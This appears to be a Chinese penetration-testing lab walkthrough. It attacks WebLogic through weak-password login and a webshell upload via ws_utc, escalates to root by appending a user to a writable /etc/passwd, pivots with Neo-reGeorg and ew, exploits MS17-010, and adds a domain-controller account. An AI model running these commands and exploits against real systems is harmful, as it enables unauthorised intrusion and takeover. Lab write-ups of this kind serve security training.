01
靶场使用说明













启动三台虚拟机后即可使用，本地若有vmnet2网卡可先删除





02
信息收集













拿到靶机ip的第一时间，最先进行的就是信息收集

信息收集中比较重要的一点，就是对目标端口开启情况的简单快速勘探，目的是用最快的速度判断出可能存在漏洞的端口

首先使用nmap进行端口扫描：

nmap -sV -A -sC 172.19.209.49 -p 1-65535

  

nmap扫描的结果中有一项7005端口存在weblogic服务，靶场中weblogic是重灾区，不妨试试看

由404页面信息可确定为weblogic服务





03
漏洞挖掘













继续对网站进行信息收集

首先对网站进行weblogic常用后台的爆破

得到http://172.19.209.49:7005/console

这个地址即为weblogic的默认后台地址

进入后台后测试弱口令

以下是weblogic常用弱口令

system:passwordweblogic:weblogic admin:secruityjoe:passwordmary:passwordsystem:sercurity  wlcsystem:wlcsystemweblogic:Oracle@123

经过测试，存在弱口令weblogic weblogic@123

1、进入后台： 勾选在base_domain下的“高级”下的“启用web服务测试页”这个选项，最后点击保存

2、进入未经授权的上传界面：

http://172.19.209.49:7005/ws_utc/config.do

3、将“通用”下的“当前工作目录”路径设置为：

/home/netuser/weblogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css

注：

Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css为通用目录

4、开始上传木马：

进入“安全”，点击“添加”，点击“浏览…”，选择你要上传的jsp木马，点击“提交”，成功上传jsp木马

5、按键“F12”，选中上传文件名元素，该标签下有个id元素(时间戳id，下面会用到），复制它。

6、上传木马的访问路径：

http://172.19.209.49:7005/ws_utc/css/config/keystore/[时间戳id]_[文件名]

7、冰蝎连接

我这为修改过名字的木马

8.获得交互式shell

python -c 'import os;os.system("/bin/sh")'





04
提权













1. /etc/passwd 可写

在服务器中进行信息搜集发现/etc/passwd 可写，由此一来可以直接通过passwd的错误配置进行提权

2.构造用户，密码加盐

首先，使用perl语言生成带有盐值的密码：

perl -le 'print crypt("test","addedsalt")'

echo"abc:adMpHktIn0tR2:0:0:User_like_root:/root:/bin/bash" >>/etc/passwd

已写入abc用户

切换至abc:test，whoami发现已获得 root 权限。





05
4.横向













信息搜集到该机器也处在107网段

传入Neo-reGeorg 的tunnel.jsp脚本

执行

python .\neoreg.py -u http://172.19.209.49:7005/ws_utc/css/config/keystore/tunnel.jsp -k xxxx

并配合proxifier使用

设置规则

使用Ladon进行MS17010扫描发现192.168.107.128存在漏洞

通过MS17-010 exp获取权限

ms17-010.bat 192.168.107.128 WIN72K8R2

go.bat 192.168.107.128 x64





06
取得域控













查询域控信息

ipconfig /all

Systeminfo

域为weak.com

nslookup weak.com

nslookup -type=SRV ldap.tcp

域控ip为192.168.48.128

/home/netuser/weblogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css/config/keystore/

将ew_for_Win.exe传入此路径

certutil.exe -urlcache -split -f http://192.168.107.129:7005/ws_utc/css/config/keystore/ew_for_Win.exe

传入至192.168.107.128

在128上执行

ew_for_Win.exe -s ssocksd -l 12300

开启socks5

代理链设置

代理设置

同样操作Ladon扫描域控是否存在MS17010

ms17-010.bat 192.168.48.128 WIN72K8R2

go.bat 192.168.48.128 x64

最后反弹出现了问题

可以通过ipc获取flag

在ladon里生成创建账号adminzxc Qaz@123!的dll

放入ms17-010目录下并在go.bat修改dll

ms17-010.bat 192.168.48.128 WIN72K8R2go.bat 192.168.48.128 x64

注入成功

net use \\192.168.48.128\ipc$ "Qaz@123!" /user:"adminzxc"

dir \192.168.48.128\c$

后续就是拿到桌面的flag
